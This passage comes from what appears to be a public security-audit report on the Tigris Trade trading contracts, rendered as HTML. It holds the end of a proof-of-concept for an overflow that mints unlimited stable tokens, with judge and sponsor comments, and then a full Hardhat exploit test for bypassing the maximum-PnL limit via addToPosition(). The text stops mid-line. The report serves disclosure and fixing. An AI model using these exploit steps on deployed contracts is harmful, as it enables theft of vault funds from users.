)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Execute the limit order</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">trading</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">).</span><span class=\"mtk11\">executeLimitOrder</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sig</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// ============================================================== //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// ======================== Close order  ======================== //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// ============================================================== //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Wait for some blocks to pass the delay</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">network</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">send</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;evm_increaseTime&quot;</span><span class=\"mtk1\">, [</span><span class=\"mtk7\">10</span><span class=\"mtk1\">])</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">network</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">send</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;evm_mine&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Close order</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">trading</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">).</span><span class=\"mtk11\">limitClose</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,          </span><span class=\"mtk3\">// id</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">true</span><span class=\"mtk1\">,       </span><span class=\"mtk3\">// take profit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">,  </span><span class=\"mtk3\">// price data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">sig</span><span class=\"mtk1\">,        </span><span class=\"mtk3\">// signature</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Print results</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tenPow18</span><span class=\"mtk1\"> = </span><span class=\"mtk8\">&quot;1000000000000000000&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">`StableToken balance at end: </span><span class=\"mtk4\">${</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">tenPow18</span><span class=\"mtk1\">).</span><span class=\"mtk11\">toString</span><span class=\"mtk1\">()</span><span class=\"mtk4\">}</span><span class=\"mtk8\">`</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">})</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/86\">TriHaz (Tigris Trade) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/86#issuecomment-1399443161\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>In contrast to other reports that have some ambiguity, this report has shown a way to undercollateralize the vault and steal effectively all value.</p>\n<p>The Warden has shown how, by leveraging <code>unchecked</code> math and using injected-inputs, it’s possible to effectively mint an infinite amount of Stable Tokens.</p>\n<p>Mitigation will require ensuring that user provided inputs do not allow for overflows.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/86#issuecomment-1407133086\">GainsGoblin (Tigris Trade) resolved</a>:</strong></p>\n<blockquote>\n<p>Mitigation: <a href=\"https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419173668\">https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419173668</a></p>\n</blockquote>\n<hr>\n<h2 id=\"h-04-bypass-the-maximum-pnl-check-to-take-extra-profit\" style=\"position:relative;\"><a href=\"#h-04-bypass-the-maximum-pnl-check-to-take-extra-profit\" aria-label=\"h 04 bypass the maximum pnl check to take extra profit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/111\">[H-04] Bypass the maximum PnL check to take extra profit</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/111\">KingNFT</a></em></p>\n<p>To protect the fund of vault, the protocol has a security mechanism which limits:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Maximum PnL is +500%. </span></span></code></pre>\n<p>source: <a href=\"https://docs.tigris.trade/protocol/trading-and-fees#limitations\">https://docs.tigris.trade/protocol/trading-and-fees#limitations</a></p>\n<p>But the implementation is missing to check this limitation while <code>addToPosition()</code>, an attacker can exploit it to get more profit than expected.</p>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The following test case shows both normal case and the exploit scenario.</p>\n<p>In the normal case,  a 990 USD margin, gets back a 500% of 4950 USD payout, and the profit is 3960 USD.</p>\n<p>In the exploit case, the attack will get an extra 2600+ USD profit than the normal case.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">const { expect } = require(&quot;chai&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">const { deployments, ethers, waffle } = require(&quot;hardhat&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">const { parseEther, formatEther } = ethers.utils;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">const { signERC2612Permit } = require(&#39;eth-permit&#39;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">const exp = require(&quot;constants&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">describe(&quot;Design Specification: Maximum PnL is +500%&quot;, function () {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let owner;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let node;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let user;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let node2;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let node3;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let proxy;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let Trading;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let trading;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let TradingExtension;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let tradingExtension;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let TradingLibrary;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let tradinglibrary;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let StableToken;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let stabletoken;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let StableVault;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let stablevault;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let position;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let pairscontract;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let referrals;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let permitSig;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let permitSigUsdc;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let MockDAI;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let mockdai;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let MockUSDC;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let mockusdc;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let badstablevault;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let chainlink;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  beforeEach(async function () {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await deployments.fixture([&#39;test&#39;]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    [owner, node, user, node2, node3, proxy] = await ethers.getSigners();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    StableToken = await deployments.get(&quot;StableToken&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    stabletoken = await ethers.getContractAt(&quot;StableToken&quot;, StableToken.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    Trading = await deployments.get(&quot;Trading&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    trading = await ethers.getContractAt(&quot;Trading&quot;, Trading.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await trading.connect(owner).setMaxWinPercent(5e10);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    TradingExtension = await deployments.get(&quot;TradingExtension&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    tradingExtension = await ethers.getContractAt(&quot;TradingExtension&quot;, TradingExtension.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    const Position = await deployments.get(&quot;Position&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    position = await ethers.getContractAt(&quot;Position&quot;, Position.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    MockDAI = await deployments.get(&quot;MockDAI&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    mockdai = await ethers.getContractAt(&quot;MockERC20&quot;, MockDAI.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    MockUSDC = await deployments.get(&quot;MockUSDC&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    mockusdc = await ethers.getContractAt(&quot;MockERC20&quot;, MockUSDC.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    const PairsContract = await deployments.get(&quot;PairsContract&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    pairscontract = await ethers.getContractAt(&quot;PairsContract&quot;, PairsContract.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    const Referrals = await deployments.get(&quot;Referrals&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    referrals = await ethers.getContractAt(&quot;Referrals&quot;, Referrals.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    StableVault = await deployments.get(&quot;StableVault&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    stablevault = await ethers.getContractAt(&quot;StableVault&quot;, StableVault.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await stablevault.connect(owner).listToken(MockDAI.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await stablevault.connect(owner).listToken(MockUSDC.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther(&quot;1&quot;));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await tradingExtension.connect(owner).setNode(node.address, true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await tradingExtension.connect(owner).setNode(node2.address, true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await tradingExtension.connect(owner).setNode(node3.address, true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await network.provider.send(&quot;evm_setNextBlockTimestamp&quot;, [2000000000]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await network.provider.send(&quot;evm_mine&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    const BadStableVault = await ethers.getContractFactory(&quot;BadStableVault&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    badstablevault = await BadStableVault.deploy(StableToken.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    const ChainlinkContract = await ethers.getContractFactory(&quot;MockChainlinkFeed&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    chainlink = await ChainlinkContract.deploy();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    TradingLibrary = await deployments.get(&quot;TradingLibrary&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    tradinglibrary = await ethers.getContractAt(&quot;TradingLibrary&quot;, TradingLibrary.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await trading.connect(owner).setLimitOrderPriceRange(1e10);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  describe(&quot;Bypass the maximum PnL check to take extra profit&quot;, function () {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    let orderId;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    let closePriceData;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    let closeSig;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    let initPrice = parseEther(&quot;1000&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    let closePrice = parseEther(&quot;2000&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    beforeEach(async function () {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let maxWin = await trading.maxWinPercent();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(maxWin.eq(5e10)).to.equal(true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let TradeInfo = [parseEther(&quot;1000&quot;), MockDAI.address, StableVault.address, parseEther(&quot;10&quot;), 1, true, parseEther(&quot;0&quot;), parseEther(&quot;0&quot;), ethers.constants.HashZero];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let PriceData = [node.address, 1, initPrice, 0, 2000000000, false];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let message = ethers.utils.keccak256(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ethers.utils.defaultAbiCoder.encode(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          [&#39;address&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;bool&#39;],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          [node.address, 1, initPrice, 0, 2000000000, false]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        )</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let sig = await node.signMessage(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Buffer.from(message.substring(2), &#39;hex&#39;)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      orderId = await position.getCount();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(await position.assetOpenPositionsLength(1)).to.equal(1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let trade = await position.trades(orderId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let marginAfterFee = trade.margin;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(marginAfterFee.eq(parseEther(&#39;990&#39;))).to.equal(true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // Some time later</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await network.provider.send(&quot;evm_setNextBlockTimestamp&quot;, [2000001000]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await network.provider.send(&quot;evm_mine&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // Now the price is doubled, profit = margin * leverage = $990 * 10 = $9900</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      closePriceData = [node.address, 1, closePrice, 0, 2000001000, false];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let closeMessage = ethers.utils.keccak256(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ethers.utils.defaultAbiCoder.encode(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          [&#39;address&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;bool&#39;],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          [node.address, 1, closePrice, 0, 2000001000, false]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        )</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      closeSig = await node.signMessage(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Buffer.from(closeMessage.substring(2), &#39;hex&#39;)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    it.only(&quot;All profit is $9900, close the order normally, only get $3960 profit&quot;, async function () {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let balanceBefore = await stabletoken.balanceOf(owner.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await trading.connect(owner).initiateCloseOrder(orderId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let balanceAfter = await stabletoken.balanceOf(owner.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let marginAfterFee = parseEther(&quot;990&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let payout = balanceAfter.sub(balanceBefore);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(payout.eq(parseEther(&quot;4950&quot;))).to.be.true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let profit = balanceAfter.sub(balanceBefore).sub(marginAfterFee);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(profit.eq(parseEther(&quot;3960&quot;))).to.be.true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    it.only(&quot;All profit is $9900, bypass the PnL check to take extra $2600 profit&quot;, async function () {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // We increase the possition first rather than closing the profit order directly</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let extraMargin = parseEther(&quot;1000&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await trading.connect(owner).addToPosition(orderId, extraMargin, closePriceData, closeSig, StableVault.address, MockDAI.address, PermitData, owner.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // 60 secs later</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await network.provider.send(&quot;evm_setNextBlockTimestamp&quot;, [2000001060]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await network.provider.send(&quot;evm_mine&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // Now we close the order to take all profit</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      closePriceData = [node.address, 1, closePrice, 0, 2000001060, false];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let closeMessage = ethers.utils.keccak256(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ethers.utils.defaultAbiCoder.encode(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          [&#39;address&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;bool&#39;],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          [node.address, 1, closePrice, 0, 2000001060, false]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        )</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      closeSig = await node.signMessage(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Buffer.from(closeMessage.substring(2), &#39;hex&#39;)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let balanceBefore = await stabletoken.balanceOf(owner.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await trading.connect(owner).initiateCloseOrder(orderId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let balanceAfter = await stabletoken.balanceOf(owner.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let marginAfterFee = 